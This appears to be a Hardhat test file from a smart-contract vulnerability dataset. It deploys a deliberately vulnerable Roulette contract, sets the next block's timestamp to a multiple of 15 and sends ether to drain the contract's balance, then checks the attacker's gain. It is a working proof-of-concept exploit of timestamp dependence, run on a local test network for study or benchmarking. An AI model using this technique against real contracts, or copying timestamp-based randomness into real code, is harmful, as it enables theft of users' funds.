const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe('attack time_manipulation/roulette.sol', function () {
    let owner, sig1, amount;
    async function deployContracts() {
        [owner, sig1] = await ethers.getSigners();

        amount =  ethers.parseEther("10");

        const EtherLotto = await ethers.getContractFactory('contracts/dataset/time_manipulation/roulette.sol:Roulette');
        const victim = await EtherLotto.connect(owner).deploy({value: amount});

    return {victim};
    }

  
    it('exploit time manipulation vulnerability', async function () {
        const {victim} = await loadFixture(deployContracts);
        const victimBalanceBefore = await ethers.provider.getBalance(victim.target);
        expect(victimBalanceBefore).to.equal(amount);

        const sig1BalanceBefore = await ethers.provider.getBalance(sig1.address);

        const blockBefore = await ethers.provider.getBlock();
        const timestampBefore = blockBefore.timestamp;


        const next = timestampBefore + 15 -(timestampBefore % 15);

        await time.setNextBlockTimestamp(next);

        const tx = await sig1.sendTransaction({
            to: victim.target,
            value: amount
        });

        const receipt = await tx.wait();

        const sig1Balance = await ethers.provider.getBalance(sig1.address);
        expect(sig1Balance).to.equal(sig1BalanceBefore - receipt.gasUsed * receipt.gasPrice + amount);
    });
  });